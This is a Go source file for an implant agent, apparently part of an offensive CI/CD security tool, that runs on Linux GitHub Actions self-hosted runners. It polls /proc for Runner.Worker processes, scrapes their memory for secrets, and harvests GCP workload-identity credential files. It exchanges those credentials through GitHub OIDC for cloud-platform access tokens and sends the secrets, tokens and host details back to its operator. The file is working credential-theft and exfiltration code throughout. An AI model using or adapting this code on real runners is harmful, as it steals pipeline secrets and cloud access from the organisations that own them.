// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

//go:build linux
// +build linux

package brisket

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/models"
	"golang.org/x/oauth2/google/externalaccount"
)

const (
	residentWatchInterval      = 100 * time.Millisecond
	residentHarvestRetryWindow = 20 * time.Second
	residentGCPCredentialWait  = 7 * time.Second
	residentGCPCredentialLimit = 128 * 1024
	residentGCPSubjectLimit    = 64 * 1024
)

var residentHarvestAttemptDelays = []time.Duration{
	250 * time.Millisecond,
	500 * time.Millisecond,
	1 * time.Second,
	2 * time.Second,
	3 * time.Second,
	5 * time.Second,
	8 * time.Second,
}

var residentExchangeGCPExternalAccount = exchangeResidentGCPExternalAccount

type residentWorkerProcess struct {
	PID       int
	Root      string
	StartTick string
	SeenAt    time.Time
}

func (a *Agent) startResidentJobWatcher(ctx context.Context) func() {
	if strings.TrimSpace(a.config.CallbackMode) != "resident" {
		return func() {}
	}
	watchCtx, cancel := context.WithCancel(ctx)
	go a.watchResidentJobs(watchCtx)
	return cancel
}

func (a *Agent) watchResidentJobs(ctx context.Context) {
	seen := make(map[string]time.Time)
	for _, worker := range residentWorkerProcesses() {
		seen[residentWorkerKey(worker)] = worker.SeenAt
	}
	ticker := time.NewTicker(residentWatchInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			for _, worker := range residentWorkerProcesses() {
				key := residentWorkerKey(worker)
				if _, ok := seen[key]; ok {
					continue
				}
				seen[key] = worker.SeenAt
				go a.harvestResidentWorker(ctx, worker)
			}
			pruneResidentSeen(seen, time.Now().Add(-12*time.Hour))
		}
	}
}

func residentWorkerKey(worker residentWorkerProcess) string {
	if worker.StartTick == "" {
		return fmt.Sprintf("%s:%d", worker.Root, worker.PID)
	}
	return worker.Root + ":" + worker.StartTick
}

func (a *Agent) harvestResidentWorker(ctx context.Context, worker residentWorkerProcess) {
	memdumpC := make(chan *MemDumpResult, 1)
	go func() {
		memdumpC <- a.dumpResidentWorkerSecrets(ctx, worker)
	}()

	observed := models.ResidentJobObservation{
		Event:                models.ResidentJobEventObserved,
		SignalSource:         "runner_worker_process",
		RunnerRoot:           worker.Root,
		WorkerPID:            worker.PID,
		WorkerProcessStarted: worker.StartTick,
		ObservedAt:           worker.SeenAt,
		HarvestProfile:       models.ResidentJobHarvestProfileLite,
	}
	observed.JobKey = residentJobKey(observed)
	observed.WorkerLog = waitForResidentWorkerLog(ctx, worker)
	if observed.WorkerLog != "" {
		observed = parseResidentWorkerLog(observed.WorkerLog, observed)
	}
	_ = a.sendResidentJob(ctx, observed, nil)

	var memdump *MemDumpResult
	select {
	case memdump = <-memdumpC:
	case <-ctx.Done():
		return
	}
	observed = refreshResidentWorkerObservation(ctx, worker, observed)
	harvested := observed
	harvested.Event = models.ResidentJobEventHarvested
	harvested.HarvestedAt = time.Now().UTC()
	if residentMemDumpHardFailure(memdump) {
		harvested.Event = models.ResidentJobEventHarvestFailed
		harvested.Error = memdump.Error
	}
	_ = a.sendResidentJob(ctx, harvested, memdump)
}

func refreshResidentWorkerObservation(ctx context.Context, worker residentWorkerProcess, observed models.ResidentJobObservation) models.ResidentJobObservation {
	if observed.WorkerLog == "" || !residentWorkerLogHasAttribution(observed.WorkerLog) {
		observed.WorkerLog = waitForResidentWorkerLog(ctx, worker)
	}
	if observed.WorkerLog != "" {
		observed = parseResidentWorkerLog(observed.WorkerLog, observed)
	}
	return observed
}

func (a *Agent) dumpResidentWorkerSecrets(ctx context.Context, worker residentWorkerProcess) *MemDumpResult {
	if result := a.waitResidentGCPWorkloadCredentials(ctx, worker.Root, residentGCPCredentialWait); residentMemDumpHasData(result) {
		return result
	}

	deadline := time.NewTimer(residentHarvestRetryWindow)
	defer deadline.Stop()

	results := make(chan *MemDumpResult, len(residentHarvestAttemptDelays))
	for _, delay := range residentHarvestAttemptDelays {
		delay := delay
		go func() {
			if delay > 0 {
				timer := time.NewTimer(delay)
				defer timer.Stop()
				select {
				case <-ctx.Done():
					return
				case <-timer.C:
				}
			}
			results <- a.dumpResidentWorkerAttempt(ctx, worker, residentHarvestAttemptIncludesRoot(delay))
		}()
	}

	var empty *MemDumpResult
	var failed *MemDumpResult
	for remaining := len(residentHarvestAttemptDelays); remaining > 0; {
		select {
		case <-ctx.Done():
			return residentMemDumpFallback(worker.PID, empty, failed)
		case <-deadline.C:
			return residentMemDumpFallback(worker.PID, empty, failed)
		case result := <-results:
			remaining--
			if residentMemDumpHasData(result) {
				return result
			}
			if result != nil && result.Error == "" {
				empty = mergeResidentMemDumpStats(worker.PID, empty, result)
			} else if result != nil {
				failed = mergeResidentMemDumpStats(worker.PID, failed, result)
			}
		}
	}
	return residentMemDumpFallback(worker.PID, empty, failed)
}

func (a *Agent) dumpResidentWorkerAttempt(ctx context.Context, worker residentWorkerProcess, includeRoot bool) *MemDumpResult {
	if result := a.dumpResidentGCPWorkloadCredentials(ctx, worker.Root); residentMemDumpHasData(result) {
		return result
	}
	return a.dumpResidentProcessTreeSecrets(worker.PID, includeRoot)
}

func (a *Agent) waitResidentGCPWorkloadCredentials(ctx context.Context, root string, wait time.Duration) *MemDumpResult {
	if wait <= 0 {
		return a.dumpResidentGCPWorkloadCredentials(ctx, root)
	}
	deadline := time.NewTimer(wait)
	defer deadline.Stop()
	ticker := time.NewTicker(residentWatchInterval)
	defer ticker.Stop()
	for {
		if result := a.dumpResidentGCPWorkloadCredentials(ctx, root); residentMemDumpHasData(result) {
			return result
		}
		select {
		case <-ctx.Done():
			return nil
		case <-deadline.C:
			return nil
		case <-ticker.C:
		}
	}
}

func (a *Agent) dumpResidentProcessTreeSecrets(pid int, includeRoot bool) *MemDumpResult {
	var empty *MemDumpResult
	var failed *MemDumpResult
	candidates := residentProcessTreePIDs(pid, includeRoot)
	if len(candidates) == 0 {
		return &MemDumpResult{ProcessID: pid, Error: "runner memory scan found no candidate processes"}
	}
	for _, candidate := range candidates {
		result := normalizeResidentMemDumpResult(candidate, a.DumpRunnerSecretsFromPID(candidate))
		if residentMemDumpHasData(result) {
			return result
		}
		if result != nil && result.Error == "" {
			empty = mergeResidentMemDumpStats(pid, empty, result)
		} else if result != nil {
			failed = mergeResidentMemDumpStats(pid, failed, result)
			if failed.Error == "" {
				failed.Error = result.Error
			}
		}
	}
	return residentMemDumpFallback(pid, empty, failed)
}

func normalizeResidentMemDumpResult(pid int, result *MemDumpResult) *MemDumpResult {
	if result == nil {
		return &MemDumpResult{ProcessID: pid, Error: "runner memory scan failed", ScanAttempts: 1, ProcessTargets: 1}
	}
	if result.ProcessID == 0 {
		result.ProcessID = pid
	}
	if result.ScanAttempts == 0 {
		result.ScanAttempts = 1
	}
	if result.ProcessTargets == 0 {
		result.ProcessTargets = 1
	}
	return result
}

func mergeResidentMemDumpStats(pid int, into, result *MemDumpResult) *MemDumpResult {
	if into == nil {
		into = &MemDumpResult{ProcessID: pid}
	}
	if into.Error == "" {
		into.Error = result.Error
	}
	into.RegionsScanned += result.RegionsScanned
	into.BytesRead += result.BytesRead
	into.ReadErrors += result.ReadErrors
	into.ScanAttempts += result.ScanAttempts
	into.ProcessTargets += result.ProcessTargets
	return into
}

func residentMemDumpHasData(result *MemDumpResult) bool {
	return result != nil && (len(result.Secrets) > 0 || len(result.Vars) > 0)
}

func residentMemDumpFallback(pid int, empty, failed *MemDumpResult) *MemDumpResult {
	if empty != nil {
		empty.Error = "runner memory scan found no secrets"
		return empty
	}
	if failed != nil {
		if residentMemDumpTimingMiss(failed.Error) {
			failed.Error = "runner memory scan found no secrets"
		}
		return failed
	}
	return &MemDumpResult{ProcessID: pid, Error: "runner memory scan found no secrets"}
}

func residentMemDumpHardFailure(result *MemDumpResult) bool {
	if result == nil || result.Error == "" {
		return false
	}
	if residentMemDumpTimingMiss(result.Error) {
		return false
	}
	return !residentMemDumpNoSecrets(result.Error)
}

type residentGCPAccessToken struct {
	AccessToken    string
	Project        string
	ServiceAccount string
	Expiry         time.Time
}

type residentGCPExternalAccountMetadata struct {
	Project        string
	ServiceAccount string
}

type residentGCPExternalAccountConfig struct {
	Type                             string `json:"type"`
	Audience                         string `json:"audience"`
	SubjectTokenType                 string `json:"subject_token_type"`
	TokenURL                         string `json:"token_url"`
	TokenInfoURL                     string `json:"token_info_url"`
	ServiceAccountImpersonationURL   string `json:"service_account_impersonation_url"`
	QuotaProjectID                   string `json:"quota_project_id"`
	WorkforcePoolUserProject         string `json:"workforce_pool_user_project"`
	ServiceAccountImpersonationEmail string `json:"service_account_impersonation_email"`
	UniverseDomain                   string `json:"universe_domain"`
	ServiceAccountImpersonation      struct {
		TokenLifetimeSeconds int `json:"token_lifetime_seconds"`
	} `json:"service_account_impersonation"`
	CredentialSource residentGCPCredentialSource `json:"credential_source"`
}

type residentGCPCredentialSource struct {
	URL     string            `json:"url"`
	Headers map[string]string `json:"headers"`
	Format  struct {
		Type                  string `json:"type"`
		SubjectTokenFieldName string `json:"subject_token_field_name"`
	} `json:"format"`
}

func (a *Agent) dumpResidentGCPWorkloadCredentials(ctx context.Context, root string) *MemDumpResult {
	path := newestResidentGCPCredentialFile(root)
	if path == "" {
		return nil
	}
	data, err := os.ReadFile(path)
	if err != nil || len(data) == 0 || len(data) > residentGCPCredentialLimit {
		return nil
	}
	metadata, err := residentGCPExternalAccountMetadataFromJSON(data)
	if err != nil {
		return nil
	}

	vars := make([]string, 0, 5)
	if metadata.Project != "" {
		vars = append(vars,
			residentRunnerVarRaw("CLOUDSDK_CORE_PROJECT", metadata.Project),
			residentRunnerVarRaw("GCLOUD_PROJECT", metadata.Project),
			residentRunnerVarRaw("GOOGLE_CLOUD_PROJECT", metadata.Project),
		)
	}
	if metadata.ServiceAccount != "" {
		vars = append(vars, residentRunnerVarRaw("GCP_SERVICE_ACCOUNT", metadata.ServiceAccount))
	}
	secrets := []string{residentRunnerSecretRaw("GCP_EXTERNAL_ACCOUNT_JSON_B64", base64.StdEncoding.EncodeToString(data))}

	token, err := residentExchangeGCPExternalAccount(ctx, data)
	if err == nil && strings.TrimSpace(token.AccessToken) != "" {
		secrets = append(secrets, residentRunnerSecretRaw("GCP_ACCESS_TOKEN", token.AccessToken))
		if token.Project != "" && metadata.Project == "" {
			vars = append(vars,
				residentRunnerVarRaw("CLOUDSDK_CORE_PROJECT", token.Project),
				residentRunnerVarRaw("GCLOUD_PROJECT", token.Project),
				residentRunnerVarRaw("GOOGLE_CLOUD_PROJECT", token.Project),
			)
		}
		if token.ServiceAccount != "" && metadata.ServiceAccount == "" {
			vars = append(vars, residentRunnerVarRaw("GCP_SERVICE_ACCOUNT", token.ServiceAccount))
		}
		if !token.Expiry.IsZero() {
			vars = append(vars, residentRunnerVarRaw("GCP_ACCESS_TOKEN_EXPIRES_AT", token.Expiry.UTC().Format(time.RFC3339)))
		}
	}

	return &MemDumpResult{
		ProcessID:      os.Getpid(),
		Secrets:        secrets,
		Vars:           vars,
		ScanAttempts:   1,
		ProcessTargets: 1,
	}
}

func newestResidentGCPCredentialFile(root string) string {
	if !residentRunnerRoot(root) {
		return ""
	}
	newest := newestResidentGCPCredentialCandidate(residentGCPCredentialGlobCandidates(root))
	if newest != "" {
		return newest
	}
	workRoot := filepath.Join(root, "_work")
	var newestMod time.Time
	seen := 0
	_ = filepath.WalkDir(workRoot, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		seen++
		if seen > 5000 {
			if entry.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}
		if entry.IsDir() {
			return nil
		}
		name := entry.Name()
		if !strings.HasPrefix(name, "gha-creds-") || !strings.HasSuffix(name, ".json") {
			return nil
		}
		info, err := entry.Info()
		if err != nil || info.Size() <= 0 || info.Size() > residentGCPCredentialLimit {
			return nil
		}
		if newest == "" || info.ModTime().After(newestMod) {
			newest = path
			newestMod = info.ModTime()
		}
		return nil
	})
	return newest
}

func residentGCPCredentialGlobCandidates(root string) []string {
	patterns := []string{
		filepath.Join(root, "_work", "*", "*", "gha-creds-*.json"),
		filepath.Join(root, "_work", "*", "gha-creds-*.json"),
		filepath.Join(root, "_work", "_temp", "gha-creds-*.json"),
	}
	seen := make(map[string]struct{})
	candidates := make([]string, 0)
	for _, pattern := range patterns {
		matches, err := filepath.Glob(pattern)
		if err != nil {
			continue
		}
		for _, match := range matches {
			if _, ok := seen[match]; ok {
				continue
			}
			seen[match] = struct{}{}
			candidates = append(candidates, match)
		}
	}
	return candidates
}

func newestResidentGCPCredentialCandidate(paths []string) string {
	var newest string
	var newestMod time.Time
	for _, path := range paths {
		info, err := os.Stat(path)
		if err != nil || info.IsDir() || info.Size() <= 0 || info.Size() > residentGCPCredentialLimit {
			continue
		}
		if newest == "" || info.ModTime().After(newestMod) {
			newest = path
			newestMod = info.ModTime()
		}
	}
	return newest
}

func exchangeResidentGCPExternalAccount(ctx context.Context, data []byte) (residentGCPAccessToken, error) {
	metadata, err := residentGCPExternalAccountMetadataFromJSON(data)
	if err != nil {
		return residentGCPAccessToken{}, err
	}
	cfg, err := residentGCPExternalAccountConfigFromJSON(data)
	if err != nil {
		return residentGCPAccessToken{}, err
	}
	subjectToken, err := residentGCPGitHubSubjectToken(ctx, cfg.CredentialSource)
	if err != nil {
		return residentGCPAccessToken{}, err
	}
	subjectTokenType := strings.TrimSpace(cfg.SubjectTokenType)
	if subjectTokenType == "" {
		subjectTokenType = "urn:ietf:params:oauth:token-type:jwt"
	}
	conf := externalaccount.Config{
		Audience:                       cfg.Audience,
		SubjectTokenType:               subjectTokenType,
		TokenURL:                       cfg.TokenURL,
		TokenInfoURL:                   cfg.TokenInfoURL,
		ServiceAccountImpersonationURL: cfg.ServiceAccountImpersonationURL,
		ServiceAccountImpersonationLifetimeSeconds: cfg.ServiceAccountImpersonation.TokenLifetimeSeconds,
		QuotaProjectID:           cfg.QuotaProjectID,
		Scopes:                   []string{"https://www.googleapis.com/auth/cloud-platform"},
		WorkforcePoolUserProject: cfg.WorkforcePoolUserProject,
		SubjectTokenSupplier:     &staticJWTSupplier{jwt: subjectToken},
		UniverseDomain:           cfg.UniverseDomain,
	}
	ts, err := externalaccount.NewTokenSource(ctx, conf)
	if err != nil {
		return residentGCPAccessToken{}, err
	}
	tok, err := ts.Token()
	if err != nil {
		return residentGCPAccessToken{}, err
	}
	return residentGCPAccessToken{
		AccessToken:    tok.AccessToken,
		Expiry:         tok.Expiry,
		Project:        metadata.Project,
		ServiceAccount: metadata.ServiceAccount,
	}, nil
}

func residentGCPGitHubSubjectToken(ctx context.Context, source residentGCPCredentialSource) (string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, source.URL, nil)
	if err != nil {
		return "", err
	}
	for k, v := range source.Headers {
		req.Header.Set(k, v)
	}
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, residentGCPSubjectLimit))
	if err != nil {
		return "", err
	}
	if resp.StatusCode < 200 || resp.StatusCode > 299 {
		return "", fmt.Errorf("GitHub OIDC subject token request failed: %s", resp.Status)
	}
	return residentGCPSubjectTokenFromResponse(data, source.Format.Type, source.Format.SubjectTokenFieldName)
}

func residentGCPSubjectTokenFromResponse(data []byte, formatType, fieldName string) (string, error) {
	body := strings.TrimSpace(string(data))
	if body == "" {
		return "", fmt.Errorf("empty GitHub OIDC subject token response")
	}
	if strings.EqualFold(strings.TrimSpace(formatType), "json") || strings.HasPrefix(body, "{") {
		var values map[string]interface{}
		if err := json.Unmarshal([]byte(body), &values); err != nil {
			return "", err
		}
		fields := []string{strings.TrimSpace(fieldName), "value", "token", "subject_token", "id_token"}
		for _, field := range fields {
			if field == "" {
				continue
			}
			if value, ok := values[field].(string); ok && strings.TrimSpace(value) != "" {
				return strings.TrimSpace(value), nil
			}
		}
		return "", fmt.Errorf("GitHub OIDC subject token field not found")
	}
	return body, nil
}

func residentGCPExternalAccountConfigFromJSON(data []byte) (residentGCPExternalAccountConfig, error) {
	var cfg residentGCPExternalAccountConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return residentGCPExternalAccountConfig{}, err
	}
	if cfg.Type != "external_account" {
		return residentGCPExternalAccountConfig{}, fmt.Errorf("unsupported GCP credential type")
	}
	if cfg.TokenURL != "" && !residentURLHostIs(cfg.TokenURL, "sts.googleapis.com") {
		return residentGCPExternalAccountConfig{}, fmt.Errorf("unsupported GCP token URL")
	}
	if !residentURLHostIs(cfg.ServiceAccountImpersonationURL, "iamcredentials.googleapis.com") {
		return residentGCPExternalAccountConfig{}, fmt.Errorf("unsupported GCP impersonation URL")
	}
	if !residentGitHubOIDCURL(cfg.CredentialSource.URL) {
		return residentGCPExternalAccountConfig{}, fmt.Errorf("unsupported GCP credential source")
	}
	if !strings.HasPrefix(cfg.CredentialSource.Headers["Authorization"], "Bearer ") {
		return residentGCPExternalAccountConfig{}, fmt.Errorf("missing GitHub OIDC authorization header")
	}
	return cfg, nil
}

func residentGCPExternalAccountMetadataFromJSON(data []byte) (residentGCPExternalAccountMetadata, error) {
	cfg, err := residentGCPExternalAccountConfigFromJSON(data)
	if err != nil {
		return residentGCPExternalAccountMetadata{}, err
	}

	serviceAccount := strings.TrimSpace(cfg.ServiceAccountImpersonationEmail)
	if serviceAccount == "" {
		serviceAccount = residentServiceAccountFromImpersonationURL(cfg.ServiceAccountImpersonationURL)
	}
	if serviceAccount == "" {
		return residentGCPExternalAccountMetadata{}, fmt.Errorf("missing GCP service account")
	}
	project := strings.TrimSpace(cfg.QuotaProjectID)
	if project == "" {
		project = strings.TrimSpace(cfg.WorkforcePoolUserProject)
	}
	if project == "" {
		project = extractProjectFromSA(serviceAccount)
	}
	return residentGCPExternalAccountMetadata{Project: project, ServiceAccount: serviceAccount}, nil
}

func residentURLHostIs(rawURL, want string) bool {
	u, err := url.Parse(rawURL)
	if err != nil {
		return false
	}
	return strings.EqualFold(u.Hostname(), want)
}

func residentGitHubOIDCURL(rawURL string) bool {
	u, err := url.Parse(rawURL)
	if err != nil {
		return false
	}
	host := strings.ToLower(strings.TrimSuffix(u.Hostname(), "."))
	for _, allowed := range []string{
		"token.actions.githubusercontent.com",
		"vstoken.actions.githubusercontent.com",
		"pipelines.actions.githubusercontent.com",
	} {
		if host == allowed {
			return true
		}
	}
	return strings.HasSuffix(host, ".actions.githubusercontent.com")
}

func residentServiceAccountFromImpersonationURL(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	const marker = "/serviceAccounts/"
	idx := strings.Index(u.Path, marker)
	if idx < 0 {
		return ""
	}
	value := strings.TrimPrefix(u.Path[idx:], marker)
	value = strings.TrimSuffix(value, ":generateAccessToken")
	decoded, err := url.PathUnescape(value)
	if err != nil {
		return ""
	}
	return decoded
}

func residentRunnerSecretRaw(name, value string) string {
	nameJSON, _ := json.Marshal(name)
	valueJSON, _ := json.Marshal(value)
	return string(nameJSON) + `{"value":` + string(valueJSON) + `,"isSecret":true}`
}

func residentRunnerVarRaw(name, value string) string {
	data, _ := json.Marshal(struct {
		K string `json:"k"`
		V string `json:"v"`
	}{K: name, V: value})
	return string(data)
}

func residentHarvestAttemptIncludesRoot(delay time.Duration) bool {
	return delay >= 2*time.Second
}

func residentMemDumpTimingMiss(err string) bool {
	err = normalizeResidentMemDumpError(err)
	if err == "" {
		return false
	}
	if strings.Contains(err, "runner memory scan found no candidate processes") {
		return true
	}
	if strings.Contains(err, "/proc/") && strings.Contains(err, "no such process") {
		return true
	}
	return strings.Contains(err, "/proc/") && strings.Contains(err, "no such file or directory")
}

func residentMemDumpNoSecrets(err string) bool {
	return normalizeResidentMemDumpError(err) == "runner memory scan found no secrets"
}

func normalizeResidentMemDumpError(err string) string {
	err = strings.ToLower(strings.TrimSpace(err))
	if err == "" {
		return ""
	}
	return err
}

func (a *Agent) sendResidentJob(ctx context.Context, observed models.ResidentJobObservation, memdump *MemDumpResult) error {
	payload := map[string]any{
		"agent_id":      a.agentID,
		"session_id":    a.config.SessionID,
		"hostname":      a.hostname,
		"os":            runtime.GOOS,
		"arch":          runtime.GOARCH,
		"pid":           os.Getpid(),
		"callback_id":   a.config.CallbackID,
		"callback_mode": a.config.CallbackMode,
		"resident_job":  observed,
	}
	if memdump != nil {
		payload["goos"] = runtime.GOOS
		payload["memdump_attempted"] = true
		payload["memdump_error"] = memdump.Error
		payload["memdump_pid"] = memdump.ProcessID
		payload["memdump_count"] = len(memdump.Secrets)
		payload["memdump_regions"] = memdump.RegionsScanned
		payload["memdump_bytes"] = memdump.BytesRead
		payload["memdump_read_errors"] = memdump.ReadErrors
		payload["memdump_scan_attempts"] = memdump.ScanAttempts
		payload["memdump_process_targets"] = memdump.ProcessTargets
		if len(memdump.Secrets) > 0 {
			payload["runner_secrets"] = memdump.Secrets
			payload["runner_pid"] = memdump.ProcessID
		}
		if len(memdump.Vars) > 0 {
			payload["runner_vars"] = memdump.Vars
		}
		if len(memdump.Endpoints) > 0 {
			payload["runner_endpoints"] = memdump.Endpoints
		}
	}
	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	return a.sendData(ctx, data)
}

func residentWorkerProcesses() []residentWorkerProcess {
	entries, err := filepath.Glob("/proc/[0-9]*")
	if err != nil {
		return nil
	}
	now := time.Now().UTC()
	workers := make([]residentWorkerProcess, 0)
	for _, entry := range entries {
		pid, err := strconv.Atoi(filepath.Base(entry))
		if err != nil {
			continue
		}
		comm, err := os.ReadFile(filepath.Join(entry, "comm"))
		if err != nil || strings.TrimSpace(string(comm)) != "Runner.Worker" {
			continue
		}
		exe, err := os.Readlink(filepath.Join(entry, "exe"))
		if err != nil || filepath.Base(exe) != "Runner.Worker" {
			continue
		}
		root := filepath.Dir(filepath.Dir(exe))
		if !residentRunnerRoot(root) {
			continue
		}
		workers = append(workers, residentWorkerProcess{
			PID:       pid,
			Root:      root,
			StartTick: residentProcessStartTick(pid),
			SeenAt:    now,
		})
	}
	return workers
}

func residentRunnerRoot(root string) bool {
	if root == "" {
		return false
	}
	if _, err := os.Stat(filepath.Join(root, "_diag")); err != nil {
		return false
	}
	if _, err := os.Stat(filepath.Join(root, "bin", "Runner.Listener")); err != nil {
		return false
	}
	return true
}

func residentProcessStartTick(pid int) string {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return ""
	}
	return residentProcessStartTickFromStat(string(data))
}

func residentProcessStartTickFromStat(text string) string {
	fields := residentProcStatFieldsAfterComm(text)
	if len(fields) < 20 {
		return ""
	}
	return fields[19]
}

func residentProcessTreePIDs(root int, includeRoot bool) []int {
	parents := make(map[int]int)
	entries, err := filepath.Glob("/proc/[0-9]*")
	if err != nil {
		if includeRoot {
			return []int{root}
		}
		return nil
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(filepath.Base(entry))
		if err != nil {
			continue
		}
		ppid, ok := residentProcessParent(pid)
		if !ok {
			continue
		}
		parents[pid] = ppid
	}
	return residentProcessTreeFromParents(root, parents, includeRoot)
}

func residentProcessParent(pid int) (int, bool) {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
	if err != nil {
		return 0, false
	}
	return residentProcessParentFromStat(string(data))
}

func residentProcessParentFromStat(text string) (int, bool) {
	fields := residentProcStatFieldsAfterComm(text)
	if len(fields) < 2 {
		return 0, false
	}
	ppid, err := strconv.Atoi(fields[1])
	return ppid, err == nil
}

func residentProcStatFieldsAfterComm(text string) []string {
	idx := strings.LastIndex(text, ")")
	if idx < 0 || idx+1 >= len(text) {
		return nil
	}
	return strings.Fields(text[idx+1:])
}

func residentProcessTreeFromParents(root int, parents map[int]int, includeRoot bool) []int {
	children := make(map[int][]int)
	for pid, ppid := range parents {
		children[ppid] = append(children[ppid], pid)
	}
	for ppid := range children {
		sort.Ints(children[ppid])
	}

	pids := make([]int, 0, len(parents)+1)
	seen := make(map[int]bool)
	queue := append([]int(nil), children[root]...)
	for len(queue) > 0 {
		pid := queue[0]
		queue = queue[1:]
		if seen[pid] {
			continue
		}
		seen[pid] = true
		pids = append(pids, pid)
		queue = append(queue, children[pid]...)
	}
	if includeRoot {
		pids = append(pids, root)
	}
	return pids
}

func waitForResidentWorkerLog(ctx context.Context, worker residentWorkerProcess) string {
	deadline := time.NewTimer(3 * time.Second)
	defer deadline.Stop()
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	var fallback string
	for {
		if path := residentWorkerOpenLog(worker); path != "" {
			fallback = path
			if residentWorkerLogHasAttribution(path) {
				return path
			}
		}
		if fallback == "" {
			if path := newestResidentWorkerLog(worker.Root, worker.SeenAt); path != "" {
				fallback = path
				if residentWorkerLogHasAttribution(path) {
					return path
				}
			}
		}
		select {
		case <-ctx.Done():
			return fallback
		case <-deadline.C:
			return fallback
		case <-ticker.C:
		}
	}
}

func residentWorkerOpenLog(worker residentWorkerProcess) string {
	fdDir := fmt.Sprintf("/proc/%d/fd", worker.PID)
	entries, err := os.ReadDir(fdDir)
	if err != nil {
		return ""
	}
	var newest string
	var newestMod time.Time
	for _, entry := range entries {
		target, err := os.Readlink(filepath.Join(fdDir, entry.Name()))
		if err != nil || strings.Contains(target, " (deleted)") || !residentWorkerLogPathMatches(worker.Root, target) {
			continue
		}
		info, err := os.Stat(target)
		if err != nil {
			continue
		}
		if newest == "" || info.ModTime().After(newestMod) {
			newest = target
			newestMod = info.ModTime()
		}
	}
	return newest
}

func residentWorkerLogPathMatches(root, path string) bool {
	if root == "" || path == "" {
		return false
	}
	cleanPath := filepath.Clean(path)
	if filepath.Dir(cleanPath) != filepath.Clean(filepath.Join(root, "_diag")) {
		return false
	}
	name := filepath.Base(cleanPath)
	return strings.HasPrefix(name, "Worker_") && strings.HasSuffix(name, ".log")
}

func newestResidentWorkerLog(root string, since time.Time) string {
	entries, err := os.ReadDir(filepath.Join(root, "_diag"))
	if err != nil {
		return ""
	}
	var newest string
	var newestMod time.Time
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasPrefix(entry.Name(), "Worker_") || !strings.HasSuffix(entry.Name(), ".log") {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(since) {
			continue
		}
		if newest == "" || info.ModTime().After(newestMod) {
			newest = filepath.Join(root, "_diag", entry.Name())
			newestMod = info.ModTime()
		}
	}
	return newest
}

func pruneResidentSeen(seen map[string]time.Time, before time.Time) {
	for key, ts := range seen {
		if ts.Before(before) {
			delete(seen, key)
		}
	}
}
